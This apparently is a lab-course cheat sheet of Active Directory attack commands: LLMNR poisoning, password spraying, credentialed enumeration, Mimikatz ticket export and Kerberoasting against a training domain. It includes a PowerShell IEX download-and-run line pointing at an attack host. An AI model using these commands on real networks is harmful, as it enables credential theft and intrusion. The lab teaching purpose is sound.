## Table of Contents

  - [Table of Contents](#Table\of\Contents)
    - [Initial Enumeration](#Initial\Enumeration)
- [LLMNR/NTB-NS Poisoning](#llmnr/ntb-ns\poisoning)
- [Password Spraying & Password Policies](#password\spraying\&\password\policies)
- [Enumerating Security Controls](#enumerating\security\controls)
- [Credentialed Enumeration](#credentialed\enumeration)
- [Enumeration by Living Off the Land](#enumeration\by\living\off\the\land)
- [Transfering Files](#transfering\files)
- [Kerberoasting](#kerberoasting)



### Initial Enumeration
|Command|Description|
|---|---|
|`nslookup ns1.inlanefreight.com`|Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host.|
|`sudo tcpdump -i ens224`|Used to start capturing network packets on the network interface proceeding the `-i` option a Linux-based host.|
|`sudo responder -I ens224 -A`|Used to start responding to & analyzing `LLMNR`, `NBT-NS` and `MDNS` queries on the interface specified proceeding the `-I` option and operating in `Passive Analysis` mode which is activated using `-A`. Performed from a Linux-based host|
|`fping -asgq 172.16.5.0/23`|Performs a ping sweep on the specified network segment from a Linux-based host.|
|`sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum`|Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (`-A`) based on a list of hosts (`hosts.txt`) specified in the file proceeding `-iL`. Then outputs the scan results to the file specified after the `-oN`option. Performed from a Linux-based host|
|`sudo git clone https://github.com/ropnop/kerbrute.git`|Uses `git` to clone the kerbrute tool from a Linux-based host.|
|`make help`|Used to list compiling options that are possible with `make` from a Linux-based host.|
|`sudo make all`|Used to compile a `Kerbrute` binary for multiple OS platforms and CPU architectures.|
|`./kerbrute_linux_amd64`|Used to test the chosen complied `Kebrute` binary from a Linux-based host.|
|`sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute`|Used to move the `Kerbrute` binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool.|
|`./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results`|Runs the Kerbrute tool to discover usernames in the domain (`INLANEFREIGHT.LOCAL`) specified proceeding the `-d` option and the associated domain controller specified proceeding `--dc`using a wordlist and outputs (`-o`) the results to a specified file. Performed from a Linux-based host.|



# LLMNR/NTB-NS Poisoning

|Command|Description|
|---|---|
|`responder -h`|Used to display the usage instructions and various options available in `Responder` from a Linux-based host.|
|`hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt`|Uses `hashcat` to crack `NTLMv2` (`-m`) hashes that were captured by responder and saved in a file (`frond_ntlmv2`). The cracking is done based on a specified wordlist.|
|`Import-Module .\Inveigh.ps1`|Using the `Import-Module` PowerShell cmd-let to import the Windows-based tool `Inveigh.ps1`.|
|`(Get-Command Invoke-Inveigh).Parameters`|Used to output many of the options & functionality available with `Invoke-Inveigh`. Peformed from a Windows-based host.|
|`Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`|Starts `Inveigh` on a Windows-based host with LLMNR & NBNS spoofing enabled and outputs the results to a file.|
|`.\Inveigh.exe`|Starts the `C#` implementation of `Inveigh` from a Windows-based host.|
|`$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \|foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}`|PowerShell script used to disable NBT-NS on a Windows host.|

# Password Spraying & Password Policies

| Command                                                                                                                              | Description                                                                                                                                                                                                                                          |
| ------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `#!/bin/bash for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}} do echo $x; done`                                 | Bash script used to generate `16,079,616` possible username combinations from a Linux-based host.                                                                                                                                                    |
| `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol`                                                                  | Uses `CrackMapExec`and valid credentials (`avazquez:Password123`) to enumerate the password policy (`--pass-pol`) from a Linux-based host.                                                                                                           |
| `rpcclient -U "" -N 172.16.5.5`                                                                                                      | Uses `rpcclient` to discover information about the domain through `SMB NULL` sessions. Performed from a Linux-based host.                                                                                                                            |
| `rpcclient $> querydominfo`                                                                                                          | Uses `rpcclient` to enumerate the password policy in a target Windows domain from a Linux-based host.                                                                                                                                                |
| `enum4linux -P 172.16.5.5`                                                                                                           | Uses `enum4linux` to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host.                                                                                                                                        |
| `enum4linux-ng -P 172.16.5.5 -oA ilfreight`                                                                                          | Uses `enum4linux-ng` to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host, then presents the output in YAML & JSON saved in a file proceeding the `-oA` option.                                                |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" \| grep -m 1 -B 10 pwdHistoryLength`                          | Uses `ldapsearch` to enumerate the password policy in a target Windows domain from a Linux-based host.                                                                                                                                               |
| `net accounts`                                                                                                                       | Used to enumerate the password policy in a Windows domain from a Windows-based host.                                                                                                                                                                 |
| `Import-Module .\PowerView.ps1`                                                                                                      | Uses the Import-Module cmd-let to import the `PowerView.ps1` tool from a Windows-based host.                                                                                                                                                         |
| `Get-DomainPolicy`                                                                                                                   | Used to enumerate the password policy in a target Windows domain from a Windows-based host.                                                                                                                                                          |
| `enum4linux -U 172.16.5.5 \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"`                                                         | Uses `enum4linux` to discover user accounts in a target Windows domain, then leverages `grep` to filter the output to just display the user from a Linux-based host.                                                                                 |
| `rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser`                                                                             | Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.                                                                                                                                                         |
| `crackmapexec smb 172.16.5.5 --users`                                                                                                | Uses `CrackMapExec` to discover users (`--users`) in a target Windows domain from a Linux-based host.                                                                                                                                                |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" \| grep sAMAccountName: \| cut -f2 -d" "` | Uses `ldapsearch` to discover users in a target Windows doman, then filters the output using `grep` to show only the `sAMAccountName` from a Linux-based host.                                                                                       |
| `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`                                                                                      | Uses the python tool `windapsearch.py` to discover users in a target Windows domain from a Linux-based host.                                                                                                                                         |
| `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done`             | Bash one-liner used to perform a password spraying attack using `rpcclient` and a list of users (`valid_users.txt`) from a Linux-based host. It also filters out failed attempts to make the output cleaner.                                         |
| `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1`                                             | Uses `kerbrute` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host.                                                                                               |
| `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +`                                                       | Uses `CrackMapExec` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using `grep`.                                          |
| `sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`                                                                        | Uses `CrackMapExec` to validate a set of credentials from a Linux-based host.                                                                                                                                                                        |
| `sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +`                    | Uses `CrackMapExec` and the -`-local-auth` flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using `grep`. |
| `Import-Module .\DomainPasswordSpray.ps1`                                                                                            | Used to import the PowerShell-based tool `DomainPasswordSpray.ps1` from a Windows-based host.                                                                                                                                                        |
| `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue`                                 | Performs a password spraying attack and outputs (-OutFile) the results to a specified file (`spray_success`) from a Windows-based host.                                                                                                              |

# Enumerating Security Controls

|Command|Description|
|---|---|
|`Get-MpComputerStatus`|PowerShell cmd-let used to check the status of `Windows Defender Anti-Virus` from a Windows-based host.|
|`Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections`|PowerShell cmd-let used to view `AppLocker` policies from a Windows-based host.|
|`$ExecutionContext.SessionState.LanguageMode`|PowerShell script used to discover the `PowerShell Language Mode` being used on a Windows-based host. Performed from a Windows-based host.|
|`Find-LAPSDelegatedGroups`|A `LAPSToolkit` function that discovers `LAPS Delegated Groups` from a Windows-based host.|
|`Find-AdmPwdExtendedRights`|A `LAPSTookit` function that checks the rights on each computer with LAPS enabled for any groups with read access and users with `All Extended Rights`. Performed from a Windows-based host.|
|`Get-LAPSComputers`|A `LAPSToolkit` function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.|

# Credentialed Enumeration

|Command|Description|
|---|---|
|`xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25`|Connects to a Windows target using valid credentials. Performed from a Linux-based host.|
|`sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users`|Authenticates with a Windows target over `smb` using valid credentials and attempts to discover more users (`--users`) in a target Windows domain. Performed from a Linux-based host.|
|`sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups`|Authenticates with a Windows target over `smb` using valid credentials and attempts to discover groups (`--groups`) in a target Windows domain. Performed from a Linux-based host.|
|`sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users`|Authenticates with a Windows target over `smb` using valid credentials and attempts to check for a list of logged on users (`--loggedon-users`) on the target Windows host. Performed from a Linux-based host.|
|`sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares`|Authenticates with a Windows target over `smb` using valid credentials and attempts to discover any smb shares (`--shares`). Performed from a Linux-based host.|
|`sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share`|Authenticates with a Windows target over `smb` using valid credentials and utilizes the CrackMapExec module (`-M`) `spider_plus` to go through each readable share (`Dev-share`) and list all readable files. The results are outputted in `JSON`. Performed from a Linux-based host.|
|`smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5`|Enumerates the target Windows domain using valid credentials and lists shares & permissions available on each within the context of the valid credentials used and the target Windows host (`-H`). Performed from a Linux-based host.|
|`smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only`|Enumerates the target Windows domain using valid credentials and performs a recursive listing (`-R`) of the specified share (`SYSVOL`) and only outputs a list of directories (`--dir-only`) in the share. Performed from a Linux-based host.|
|`rpcclient $> queryuser 0x457`|Enumerates a target user account in a Windows domain using its relative identifier (`0x457`). Performed from a Linux-based host.|
|`rpcclient $> enumdomusers`|Discovers user accounts in a target Windows domain and their associated relative identifiers (`rid`). Performed from a Linux-based host.|
|`psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125`|Impacket tool used to connect to the `CLI` of a Windows target via the `ADMIN$` administrative share with valid credentials. Performed from a Linux-based host.|
|`wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5`|Impacket tool used to connect to the `CLI` of a Windows target via `WMI` with valid credentials. Performed from a Linux-based host.|
|`windapsearch.py -h`|Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host.|
|`python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 --da`|Used to enumerate the domain admins group (`--da`) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host.|
|`python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 -PU`|Used to perform a recursive search (`-PU`) for users with nested permissions using valid credentials. Performed from a Linux-based host.|
|`sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all`|Executes the python implementation of BloodHound (`bloodhound.py`) with valid credentials and specifies a name server (`-ns`) and target Windows domain (`inlanefreight.local`) as well as runs all checks (`-c all`). Runs using valid credentials. Performed from a Linux-based host.|

# Enumeration by Living Off the Land

|Command|Description|
|---|---|
|`Get-Module`|PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host.|
|`Import-Module ActiveDirectory`|Loads the `Active Directory` PowerShell module from a Windows-based host.|
|`Get-ADDomain`|PowerShell cmd-let used to gather Windows domain information from a Windows-based host.|
|`Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`|PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by `ServicePrincipalName`. Performed from a Windows-based host.|
|`Get-ADTrust -Filter *`|PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (`-Filter *`). Performed from a Windows-based host.|
|`Get-ADGroup -Filter * \| select name`|PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (`select name`). Performed from a Windows-based host.|
|`Get-ADGroup -Identity "Backup Operators"`|PowerShell cmd-let used to search for a specifc group (`-Identity "Backup Operators"`). Performed from a Windows-based host.|
|`Get-ADGroupMember -Identity "Backup Operators"`|PowerShell cmd-let used to discover the members of a specific group (`-Identity "Backup Operators"`). Performed from a Windows-based host.|
|`Export-PowerViewCSV`|PowerView script used to append results to a `CSV` file. Performed from a Windows-based host.|
|`ConvertTo-SID`|PowerView script used to convert a `User` or `Group` name to it's `SID`. Performed from a Windows-based host.|
|`Get-DomainSPNTicket`|PowerView script used to request the kerberos ticket for a specified service principal name (`SPN`). Performed from a Windows-based host.|
|`Get-Domain`|PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host.|
|`Get-DomainController`|PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host.|
|`Get-DomainUser`|PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host.|
|`Get-DomainComputer`|PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host.|
|`Get-DomainGroup`|PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host.|
|`Get-DomainOU`|PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host.|
|`Find-InterestingDomainAcl`|PowerView script used to find object `ACLs` in the domain with modification rights set to non-built in objects. Performed from a Windows-based host.|
|`Get-DomainGroupMember`|PowerView script used to return the members of a specific domain group. Performed from a Windows-based host.|
|`Get-DomainFileServer`|PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host.|
|`Get-DomainDFSShare`|PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host.|
|`Get-DomainGPO`|PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host.|
|`Get-DomainPolicy`|PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host.|
|`Get-NetLocalGroup`|PowerView script used to enumerate local groups on a local or remote machine. Performed from a Windows-based host.|
|`Get-NetLocalGroupMember`|PowerView script enumerate members of a specific local group. Performed from a Windows-based host.|
|`Get-NetShare`|PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host.|
|`Get-NetSession`|PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host.|
|`Test-AdminAccess`|PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host.|
|`Find-DomainUserLocation`|PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host.|
|`Find-DomainShare`|PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host.|
|`Find-InterestingDomainShareFile`|PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host.|
|`Find-LocalAdminAccess`|PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host.|
|`Get-DomainTrust`|PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host.|
|`Get-ForestTrust`|PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host.|
|`Get-DomainForeignUser`|PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host.|
|`Get-DomainForeignGroupMember`|PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host.|
|`Get-DomainTrustMapping`|PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host.|
|`Get-DomainGroupMember -Identity "Domain Admins" -Recurse`|PowerView script used to list all the members of a target group (`"Domain Admins"`) through the use of the recurse option (`-Recurse`). Performed from a Windows-based host.|
|`Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName`|PowerView script used to find users on the target Windows domain that have the `Service Principal Name` set. Performed from a Windows-based host.|
|`.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data`|Runs a tool called `Snaffler` against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host.|

# Transfering Files

|Command|Description|
|---|---|
|`sudo python3 -m http.server 8001`|Starts a python web server for quick hosting of files. Performed from a Linux-basd host.|
|`"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"`|PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host.|
|`impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/`|Starts a impacket `SMB` server for quick hosting of a file. Performed from a Windows-based host.|

# Kerberoasting

|Command|Description|
|---|---|
|`sudo python3 -m pip install .`|Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host.|
|`GetUserSPNs.py -h`|Impacket tool used to display the options and functionality of `GetUserSPNs.py` from a Linux-based host.|
|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday`|Impacket tool used to get a list of `SPNs` on the target Windows domain from a Linux-based host.|
|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request`|Impacket tool used to download/request (`-request`) all TGS tickets for offline processing from a Linux-based host.|
|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev`|Impacket tool used to download/request (`-request-user`) a TGS ticket for a specific user account (`sqldev`) from a Linux-based host.|
|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs`|Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (`-outputfile sqldev_tgs`) linux-based host.|
|`hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force`|Attempts to crack the Kerberos (`-m 13100`) ticket hash (`sqldev_tgs`) using `hashcat` and a wordlist (`rockyou.txt`) from a Linux-based host.|
|`setspn.exe -Q */*`|Used to enumerate `SPNs` in a target Windows domain from a Windows-based host.|
|`Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"`|PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.|
|`setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \| Select-String '^CN' -Context 0,1 \| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }`|Used to download/request all TGS tickets from a WIndows-based host.|
|`mimikatz # base64 /out:true`|`Mimikatz` command that ensures TGS tickets are extracted in `base64` format from a Windows-based host.|
|`kerberos::list /export`|`Mimikatz` command used to extract the TGS tickets from a Windows-based host.|
|`echo "<base64 blob>" \| tr -d \\n`|Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.|
|`cat encoded_file \| base64 -d > sqldev.kirbi`|Used to output a file (`encoded_file`) into a .kirbi file in base64 (`base64 -d > sqldev.kirbi`) format from a Linux-based host.|
|`python2.7 kirbi2john.py sqldev.kirbi`|Used to extract the `Kerberos ticket`. This also creates a file called `crack_file` from a Linux-based host.|
|`sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat`|Used to modify the `crack_file` for `Hashcat` from a Linux-based host.|
|`cat sqldev_tgs_hashcat`|Used to view the prepared hash from a Linux-based host.|
|`hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt`|Used to crack the prepared Kerberos ticket hash (`sqldev_tgs_hashcat`) using a wordlist (`rockyou.txt`) from a Linux-based host.|
|`Import-Module .\PowerView.ps1 Get-DomainUser * -spn \| select samaccountname`|Uses PowerView tool to extract `TGS Tickets` . Performed from a Windows-based host.|
|`Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat`|PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for `Hashcat` from a Windows-based host.|


